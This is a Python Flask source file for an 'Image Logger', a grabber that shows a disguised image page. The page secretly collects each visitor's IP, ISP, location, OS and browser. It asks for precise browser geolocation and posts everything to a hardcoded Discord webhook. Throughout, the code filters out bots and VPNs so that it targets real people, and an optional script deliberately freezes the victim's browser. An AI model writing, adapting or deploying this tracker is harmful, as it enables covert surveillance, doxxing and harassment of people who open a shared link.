from flask import Flask, request, redirect, Response
import traceback, requests, base64, httpagentparser
from urllib import parse

app = Flask(__name__)

config = {
    "webhook": "https://discord.com/api/webhooks/1473070680508727389/Z4P1t3R2vSGs0Zte_sGprU9vkfRV649fw5yWDoBnxyseHi14UlfvNovhXpEKzyjOhDIs",
    "image": "https://media.tenor.com/NAU5DQazc8EAAAAe/middleclick-middleclick-for-calculator.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": True,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "",
        "richMessage": False,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat')) + ', ' + str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}

""",
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def handle_request(path):
    try:
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        useragent = request.headers.get('user-agent', '')
        s = request.full_path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

        if config["imageArgument"]:
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        data = f'''<style>body {{ margin:0; padding:0; }}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

        if ip.startswith(blacklistedIPs):
            return ""

        if botCheck(ip, useragent):
            if config["buggedImage"]:
                response = Response(binaries["loading"], mimetype='image/jpeg')
            else:
                return redirect(url, code=302)
            makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
            return response

        if dic.get("g") and config["accurateLocation"]:
            location = base64.b64decode(dic.get("g").encode()).decode()
            result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
        else:
            result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)

        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp", ""))
            message = message.replace("{asn}", result.get("as", ""))
            message = message.replace("{country}", result.get("country", ""))
            message = message.replace("{region}", result.get("regionName", ""))
            message = message.replace("{city}", result.get("city", ""))
            message = message.replace("{lat}", str(result.get("lat", "")))
            message = message.replace("{long}", str(result.get("lon", "")))
            message = message.replace("{timezone}", result.get("timezone", ""))
            message = message.replace("{mobile}", str(result.get("mobile", False)))
            message = message.replace("{vpn}", str(result.get("proxy", False)))
            message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
        else:
            if config["message"]["doMessage"]:
                data = message.encode()
            if config["crashBrowser"]:
                data = data + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["accurateLocation"]:
            script = """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
            data = data.replace(b'</body>', (script + '</body>').encode())

        return Response(data, mimetype='text/html')

    except Exception as e:
        reportError(traceback.format_exc())
        return "500 - Internal Server Error", 500

# ----- Explicit entry points for Vercel -----
application = app
handler = app

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
